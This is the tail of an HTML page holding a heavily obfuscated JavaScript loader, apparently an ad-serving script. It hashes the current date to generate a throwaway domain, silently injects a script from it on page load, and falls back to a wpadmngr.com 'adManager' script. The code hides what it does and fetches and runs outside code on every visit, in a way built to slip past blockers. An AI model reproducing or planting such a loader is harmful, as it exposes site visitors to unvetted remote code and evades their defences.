Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>